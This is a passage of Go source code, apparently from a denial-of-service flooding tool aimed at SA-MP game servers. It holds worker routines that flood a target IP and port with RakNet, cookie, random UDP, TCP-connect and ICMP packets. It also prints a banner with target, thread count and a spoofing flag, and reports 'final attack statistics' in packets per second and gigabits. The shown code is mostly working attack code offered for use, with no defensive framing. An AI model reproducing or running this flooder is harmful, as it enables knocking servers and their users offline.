				go func(id int) { defer wg.Done(); workerSAMP(id, variants.invalid) }(i)
			}
		case "RAKNET":
			if cfg.enableRakNet {
				for i := 0; i < count; i++ {
					wg.Add(1)
					go func(id int) {
						defer wg.Done()
						conn := getConn()
						if conn == nil { return }
						defer putConn(conn)
						rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(i)))
						for time.Now().Before(stopTime) {
							pkt := variants.raknet[rng.Intn(len(variants.raknet))]
							sendPacket(conn, pkt)
						}
					}(i)
				}
			}
		case "COOKIE":
			if cfg.enableConn {
				for i := 0; i < count; i++ {
					wg.Add(1)
					go func(id int) {
						defer wg.Done()
						conn := getConn()
						if conn == nil { return }
						defer putConn(conn)
						rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(i)))
						for time.Now().Before(stopTime) {
							pkt := variants.cookie[rng.Intn(len(variants.cookie))]
							for b := 0; b < 15; b++ {
								sendPacket(conn, pkt)
							}
							spinWait(20)
						}
					}(i)
				}
			}
		case "UDP":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) {
					defer wg.Done()
					conn := getConn()
					if conn == nil { return }
					defer putConn(conn)
					rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(i)))
					for time.Now().Before(stopTime) {
						pkt := make([]byte, 256)
						rng.Read(pkt)
						sendPacket(conn, pkt)
					}
				}(i)
			}
		case "TCP":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) {
					defer wg.Done()
					for time.Now().Before(stopTime) {
						c, _ := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPortInt), time.Second)
						if c != nil {
							c.Close()
							atomic.AddUint64(&totalPackets, 1)
						}
						time.Sleep(time.Millisecond)
					}
				}(i)
			}
		case "ICMP":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) {
					defer wg.Done()
					c, err := net.Dial("ip4:icmp", targetIP)
					if err != nil { return }
					defer c.Close()
					pkt := make([]byte, 64)
					pkt[0] = 8
					for time.Now().Before(stopTime) {
						c.Write(pkt)
						atomic.AddUint64(&totalPackets, 1)
						time.Sleep(time.Millisecond * 10)
					}
				}(i)
			}
		}
	}
	
	wg.Wait()
}

// ==================== WORKER FUNCTIONS ====================
func workerSAMP(workerID int, pool [][]byte) {
	conn := getConn()
	if conn == nil {
		return
	}
	defer putConn(conn)
	
	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
	
	for time.Now().Before(stopTime) {
		idx := rng.Intn(len(pool))
		packet := pool[idx]
		
		burst := cfg.burstMin + rng.Intn(cfg.burstMax-cfg.burstMin+1)
		for b := 0; b < burst; b++ {
			sendPacket(conn, packet)
			if b < burst-1 {
				spinWait(50 + rng.Intn(100))
			}
		}
		
		if workerID%100 == 0 {
			runtime.Gosched()
		}
	}
}

// ==================== UTILITY FUNCTIONS ====================
func getConn() *ConnPool {
	c := udpPool.Get()
	if c == nil {
		return nil
	}
	return c.(*ConnPool)
}

func putConn(c *ConnPool) {
	if c != nil && c.conn != nil {
		udpPool.Put(c)
	}
}

func sendPacket(c *ConnPool, data []byte) {
	if c == nil || len(data) == 0 {
		return
	}
	
	c.mu.Lock()
	n, err := c.conn.Write(data)
	c.mu.Unlock()
	
	if err == nil && n > 0 {
		atomic.AddUint64(&totalPackets, 1)
		atomic.AddUint64(&totalBytes, uint64(n))
	}
}

func spinWait(ns int) {
	start := time.Now()
	for time.Since(start).Nanoseconds() < int64(ns) {
		runtime.Gosched()
	}
}

func printBanner() {
	fmt.Printf("\n")
	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║              SAMP ULTIMATE ENGINE v10.0 - PROTOCOL DOMINATION              ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║ Target: %-22s Port: %-8d Threads: %-10d              ║\n", targetIP, targetPortInt, cfg.threadCount)
	fmt.Printf("║ Duration: %-20ds Method: %-12s                                   ║\n", cfg.durationSec, cfg.attackMethod)
	fmt.Printf("║ Spoofing: %-20v RakNet: %-20v                                   ║\n", cfg.enableSpoof, cfg.enableRakNet)
	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
	fmt.Printf("\n")
}

func waitAndReport() {
	ticker := time.NewTicker(5 * time.Second)
	done := make(chan bool)
	
	go func() {
		for {
			select {
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				pkts := atomic.LoadUint64(&totalPackets)
				bytes := atomic.LoadUint64(&totalBytes)
				
				pps := float64(pkts) / elapsed
				mbps := (float64(bytes) * 8.0) / (elapsed * 1024 * 1024)
				
				fmt.Printf("\r⏳ %.0fs | PPS: %.0f | MBPS: %.1f | Packets: %s", 
					elapsed, pps, mbps, formatNum(pkts))
			case <-done:
				return
			}
		}
	}()
	
	time.Sleep(time.Until(stopTime))
	done <- true
	ticker.Stop()
	
	printFinalStats()
}

func printFinalStats() {
	pkts := atomic.LoadUint64(&totalPackets)
	bytes := atomic.LoadUint64(&totalBytes)
	dur := uint64(cfg.durationSec)
	
	fmt.Printf("\n\n")
	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║                           FINAL ATTACK STATISTICS                            ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║  📦 TOTAL PACKETS:  %-20s                                   ║\n", formatNum(pkts))
	fmt.Printf("║  📊 TOTAL DATA:     %-10.2f MB (%-6.2f GB)                           ║\n", 
		float64(bytes)/(1024*1024), float64(bytes)/(1024*1024*1024))
	fmt.Printf("║  ⚡ AVERAGE PPS:    %-20s                                   ║\n", formatNum(pkts/dur))
	fmt.Printf("║  🌐 AVERAGE MBPS:   %-10.2f                                   ║\n", 
		(float64(bytes*8)/float64(dur))/(1024*1024))
	fmt.Printf("║  💀 AVERAGE GBPS:   %-10.2f                                   ║\n", 
		(float64(bytes*8)/float64(dur))/(1024*1024*1024))
	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
}

func formatNum(n uint64) string {
	if n < 1000 {
		return fmt.Sprintf("%d", n)
	}
	if n < 1000000 {
		return fmt.Sprintf("%.1fK", float64(n)/1000)
	}
	if n < 1000000000 {
		return fmt.Sprintf("%.1fM", float64(n)/1000000)
	}
	return fmt.Sprintf("%.1fB", float64(n)/1000000000)
}

// Cleanup raw socket on exit
func cleanup() {
	if rawSocket >= 0 {
		syscall.Close(rawSocket)
	}
}

func init() {
	// Register cleanup
	go func() {
		<-time.After(time.Duration(cfg.durationSec+10) * time.Second)
		cleanup()
	}()
}
